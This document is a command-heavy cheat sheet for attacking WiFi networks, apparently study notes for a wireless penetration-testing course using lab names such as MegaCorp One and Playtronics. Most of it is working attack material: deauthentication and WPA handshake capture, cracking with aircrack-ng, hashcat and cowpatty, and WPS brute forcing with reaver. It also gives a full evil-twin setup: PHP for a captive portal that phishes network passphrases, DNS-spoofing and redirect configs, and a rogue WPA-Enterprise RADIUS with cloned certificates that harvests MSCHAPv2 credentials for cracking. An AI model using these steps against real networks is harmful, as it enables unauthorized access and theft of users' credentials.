# WiFi

## Card Config

See card configuration

```bash
sudo airmon-ng
```

See USB info

```bash
sudo lsusb -vv
```

See Driver info

```bash
sudo modinfo <drivername>
```

Update driver params

```bash
sudo modprobe ath9k_htc blink=0
```

List All loaded modules

```bash
lsmod
```

Unload a driver

```bash
rmmod <driver>
```

Manually Load a module

```bash
insmod ./<path.mod.ko>
```

See all detail

```bash
sudo iw list
```

List SSIDs

```bash
sudo iw dev wlan0 scan | grep SSID
```

Get a list of SSIDs and Channel

```bash
sudo iw dev wlan0 scan | egrep "DS Parameter set|SSID:"
```

Add Monitor device

```bash
sudo ip link set wlan0mon up
```

Create a virtual device for use when scanning

```bash
sudo iw dev wlan0 interface add wlan0mon type monitor
```

## Wireshark Filters

### Display Filters

Filter SSID

```bash
wlan.ssid== "TP-Link_1516"
```

Beacon frames only

```bash
wlan.fc.subtype == 8
```

### Capture Filters

[Filters](https://www.wireshark.org/docs/man-pages/pcap-filter.html)

Exclude beacon frames

```bash
not subtype beacon
```

---

## Airmon-ng

### Check and kill

Check and kill interfering processes

```bash
sudo airmon-ng check 
sudo airmon-ng check kill
```

### Enable

Enable monitor mode

```bash
sudo airmon-ng start wlan0
```

Enable monitor mode for a channel

```bash
sudo airmon-ng start wlan0 <channel number>
```

### Disable

Disable monitor mode

```bash
sudo airmon-ng stop wlan0
```

## Airodump-ng

### Important Options

| flag    | action              |
| ------- | ------------------- |
| -w      | Write file location |
| --bssid | Filter a BSSID      |
| -c      | Filter a channel    |

### Sniff a Specific AP

```bash
sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w cap1 wlan0
```

## Aireplay-ng

### Injection test

Ensure you run airmonng setting the channel to ensure it tests correctly

```bash
sudo aireplay-ng -9 wlan0
```

### Targeted Injection test

```bash
sudo aireplay-ng -9 wlan0 -e TP-Link_1516 -a 50:91:E3:9A:15:16
```

### Card-to-Card Test

```bash
sudo aireplay-ng -9 wlan0 wlan0
```

## Aircrack-ng

### Test speed

```bash
aircrack-ng -S
```

### CPU Info

```bash
aircrack-ng -u
```

### Crack a pcap with a handshape

```bash
aircrack-ng name-01.cap -w $ROCKYOU
```

## Airdecap-ng

Clean CAP file

### Remove the wifi headers

```bash
airdecap-ng -b 50:91:E3:9A:15:16 TP-Link_open-01.cap
```

## Airgraph-ng

Create a graph of the airodump csv

### Create a PNG graph of all APs and stations

```bash
sudo airgraph-ng -i all_channels-01.csv -o home.png -g CAPR
```

### Create a probe graph from clients

```bash
sudo airgraph-ng -i all_channels-01.csv -oclients.png -g CPG 
```

## Attack WPA

### capture a handshake with deauth

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0 # Cature the BSSID and Channel
sudo airodump-ng wlan0 -c 1 --bssid 50:91:E3:9A:15:16 -w wpa
sudo aireplay-ng -0 1 -a  50:91:E3:9A:15:16 -c C6:3B:2F:DA:84:77 wlan0 # Sue the BSSID and Client Mac
```

### once we have a handshake

```bash
aircrack-ng wpa-01.cap -b 50:91:E3:9A:15:16  -w test_words
```

### Hashcat crack wifi

```bash
mode 22000
```

### John with Aircrack

```bash
john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e wifu -w - ~/wpa-01.cap
```

### Crunch with Aircrack

```bash
crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap -w -
```

### Crunch with rsmangler

```bash
rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu rsmangler-01.cap -w -
```

### Pre calculate the PMK before cracking

This speeds up cracking 100x

```bash
echo TP-Link_1516 > essid.txt
airolib-ng wifi.sqlite --import essid essid.txt       # Import the ESSID
airolib-ng wifi.sqlite --stats 
airolib-ng wifi.sqlite --import passwd test_words     # Import the Passwords
airolib-ng wifi.sqlite --batch                        # Calculate the hashes
aircrack-ng -r wifi.sqlite wpa-01.cap                 # Crack with precalculated keys
```

## Capture for use with hashcat

```bash
// COMMANDS //
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service

sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon --enable_status=15 

sudo systemctl start wpa_supplicant.service
sudo systemctl start NetworkManager.service

hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng

hashcat -m 22000 hash.hc22000 wordlist.txt
```

### Precompute hashes Cowpatty

If we have the ESSID before a pentest we can precalculat the hashes

```bash
genpmk -f /usr/share/john/password.lst -d wifuhashes -s wifu
cowpatty -r wpajohn-01.cap -d wifuhashes -s wifu
```

## Router Type

First 3 hex number in bssis map
to [oui](https://standards-oui.ieee.org/oui/oui.txt)
[OUI Lookup](https://www.wireshark.org/tools/oui-lookup.html)

## Crack WPS

### See the APs using wash

```bash
wash -i wlan0mon
```

### Attempt to brute force

- Rate Limit will probably kick in

```bash
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v
```

### Attempt a PixieWPS attack

```bash
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K
```

## Common pins by Vendor

```bash
sudo apt install airgeddon
source /usr/share/airgeddon/known_pins.db
echo ${PINDB["0013F7"]}
```

The value in the brackets is the first 24 bits (3 bytes - 00:13:F3)

## Run Evil AP

```text
interface=wlan0
ssid=TP-Link_1516
channel=1
hw_mode=g
ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=donkie123
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
mana_wpaout=/tmp/tslink.hccapx
```

sudo hostapd-mana Mostar-mana.conf

The Handshake will be captured.

## Captive Portal

Download a webpage as base

```bash
wget -r -l2 https://www.megacorpone.com
```

The index page

```php
<!DOCTYPE html>
<html lang="en">

 <head>
  <link href="assets/css/style.css" rel="stylesheet">
  <title>MegaCorp One - Nanotechnology Is the Future</title>
 </head>
 <body style="background-color:#000000;">
  <div class="navbar navbar-default navbar-fixed-top" role="navigation">
   <div class="container">
    <div class="navbar-header">
     <a class="navbar-brand" style="font-family: 'Raleway', sans-serif;font-weight: 900;" href="index.php">MegaCorp One</a>
    </div>
   </div>
  </div>

  <div id="headerwrap" class="old-bd">
   <div class="row centered">
    <div class="col-lg-8 col-lg-offset-2">
     <?php
      if (isset($_GET["success"])) {
       echo '<h3>Login successful</h3>';
       echo '<h3>You may close this page</h3>';
      } else {
       if (isset($_GET["failure"])) {
        echo '<h3>Invalid network key, try again</h3><br/><br/>';
       }
     ?>
    <h3>Enter network key</h3><br/><br/>
    <form action="login_check.php" method="post">
     <input type="password" id="passphrase" name="passphrase"><br/><br/>
     <input type="submit" value="Connect"/>
    </form>
    <?php
      }
    ?>
    </div>

    <div class="col-lg-4 col-lg-offset-4 himg ">
     <i class="fa fa-cog" aria-hidden="true"></i>
    </div>
   </div>
  </div>

 </body>
</html>
```

The login check file

```php
<?php
# Path of the handshake PCAP
$handshake_path = '/home/kali/discovery-01.cap';
# ESSID
$essid = 'MegaCorp One Lab';
# Path where a successful passphrase will be written
# Apache2's user must have write permissions
# For anything under /tmp, it's actually under a subdirectory
#  in /tmp due to Systemd PrivateTmp feature:
#  /tmp/systemd-private-$(uuid)-${service_name}-${hash}/$success_path
# See https://www.freedesktop.org/software/systemd/man/systemd.exec.html
$success_path = '/tmp/passphrase.txt';
# Passphrase entered by the user
$passphrase = $_POST['passphrase'];

# Make sure passphrase exists and
# is within passphrase length limits (8-63 chars)
if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

# Check if the correct passphrase has been found already ...
$correct_pass = file_get_contents($success_path);
if ($correct_pass !== FALSE) {

  # .. and if it matches the current one,
  # then redirect the client accordingly
  if ($correct_pass == $passphrase) {
    header('Location: index.php?success');
  } else {
    header('Location: index.php?failure');
  }
  die();
}

# Add passphrase to wordlist ...
$wordlist_path = tempnam('/tmp', 'wordlist');
$wordlist_file = fopen($wordlist_path, "w");
fwrite($wordlist_file, $passphrase);
fclose($wordlist_file);

# ... then crack the PCAP with it to see if it matches
# If ESSID contains single quotes, they need escaping
exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);

$key_found = FALSE;
# If the exit value is 0, aircrack-ng successfully ran
# We'll now have to inspect output and search for
# "KEY FOUND" to confirm the passphrase was correct
if ($retval == 0) {
 foreach($output as $line) {
  if (strpos($line, "KEY FOUND") !== FALSE) {
   $key_found = TRUE;
   break;
  }
 }
}

if ($key_found) {

  # Save the passphrase and redirect the user to the success page
  @rename($wordlist_path, $success_path);

  header('Location: index.php?success');
} else {
  # Delete temporary file and redirect user back to login page
  @unlink($wordlist_file);

  header('Location: index.php?failure');
}
?>
```

## Host the portal

Set the IP as it cam't reach the internet it will connect o our IP

```bash
sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up
```

### Setup DHCP

```bash
sudo apt install dnsmasq

cat << HERE > mco-dnsmasq.conf
# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100

# DNS Spoofing
# This should cover most queries
# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255
HERE
```

### Start the DHCP & DNS Server

```bash
sudo dnsmasq --conf-file=mco-dnsmasq.conf
```

### Tail the log

```bash
sudo tail /var/log/syslog | grep dnsmasq
```

### Confirm DHCP and CND

```bash
sudo netstat -lnp
```

## Setup NFTables for clients that ignore DNS

```bash
sudo apt install nftables
sudo nft add table ip nat
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```

## Update apache config

```dns
cat /etc/apache2/sites-enabled/000-default.conf
...

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

</VirtualHost>
```

### Enable rewrite module

```bash
sudo a2enmod rewrite
sudo a2enmod alias
```

## Special Chrome support

```xml
<VirtualHost *:443>

  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 https://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt https://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt https://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L]

  # Use existing snakeoil certificates
  SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
  SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
</VirtualHost>
```

## Add ssl support

```bash
sudo a2enmod ssl
sudo systemctl restart apache2
```

## Rogue AP with Captive Portal

### Create a hostapd config

```bash
interface=wlan0
ssid=MegaCorp One Lab
channel=11

# 802.11n
hw_mode=g
ieee80211n=1

# Uncomment the following lines to use OWE instead of an open network
#wpa=2
#ieee80211w=2
#wpa_key_mgmt=OWE
#rsn_pairwise=CCMP
```

### Start hostapd

```bash
sudo hostapd -B mco-hostapd.conf
```

### Check logs

```bash
sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
sudo tail -f /var/log/apache2/access.log
```

### Once user has accessed and entered the password

```bash
sudo find /tmp/ -iname passphrase.txt
sudo cat /tmp/systemd-private-0a505bfcaf7d4db699274121e3ce3849-apache2.service-lIP3ds/tmp/passphrase.txt
```

## WPA Enterprise

```bash
AUTH = MGT
```

### Capture the BSSID and SSID

```bash
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

sudo airmon-ng start
sudo airodump-ng wlan0
```

### restart caapture and then deauth a client

```bash
sudo airodump-ng -c <channel> -w <network_essid> wlan0
```

deauth

```bash
sudo airplay0ng -0 1 -a <API_MAC> -c <client_MAC> wlan0
```

once we have the handshake disable monitor mode

```bash
sudo airmon-ng stop
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
```

### Extract the certificate use tshark / wireshark

```bash
tshark -r <PCAP.pcap> -R 'wlan.bssid==<BSSID> && eap && tls.handshake.certificate' -2 -T fields -e  ssl.handshake.certificate | sed 's/://g' | xxd -ps -r | tee <CERT.DER> | openssl x509 -inform der -text
```

### Convert to PEM

```bash
openssl x509 -inform der -in cert.der -outform pem -out cert.crt
```

### Update Configs

Update CA.CNF of Open Radius to match out Captured cert

```bash
sudo vi /etc/freeradius/3.0/certs/ca.cnf

[certificate_authority]
countryName  = US
stateOrProvinceName = CA
localityName  = San Francisco
organizationName = Playtronics,
emailAddress  = ca@playtronics.com,
commonName  = "Playtronics Certificate Authority"
```

Also update the server certificate config to match the server cert.

```bash
sudo vi /etc/freeradius/3.0/certs/server.cnf

[server]
countryName  = US
stateOrProvinceName = CA
localityName  = San Francisco
organizationName = Playtronics,
emailAddress  = admin@playtronics.com,
commonName  = "Playtronics"
```

### Build Ceritficates

#### rebuild Diffe-Helmon keys

```bash
sudo su
cd /etc/freeradius/3.0/certs/
rm dh
make
```

### Create AP

#### Create HostAPDMana Config

```bash
sudo vi /etc/hostapd-mana/hostapd-mana.conf  


# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2 & WPA Enterprise
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Mana WPE Options
mana_wpe=1
mana_credout=/tmp/hostapd.credout  # Credential output file
mana_eapsuccess=1  # Send EAP success
mana_eaptls=1      # EAP TLS MitM
```

---

## Create the Users File for Mana

Edit `/etc/hostapd-mana/mana.eap_user`:
```bash
vi /etc/hostapd-mana/mana.eap_user
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

---

## Start the Host

```bash
sudo hostapd-mana /etc/hostapd-mana/hostapd-mana.conf
```

Once a host authenticates, you should see output like:
```bash
MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
```

Crack it using asleap:
```bash
asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
```

---

## Manually Connect to a Network

```bash
wpa_passphrase <SSID> <password> > client.conf
sudo wpa_supplicant -i wlan0 -c client.conf
sudo dhclient wlan0
```

---

## Setup AWUS1900 / AWUS036ACH (Realtek)

```bash
sudo apt update
sudo apt install realtek-rtl88xxau-dkms
sudo apt install -y linux-headers-$(uname -r) build-essential bc dkms git libelf-dev rfkill iw
```
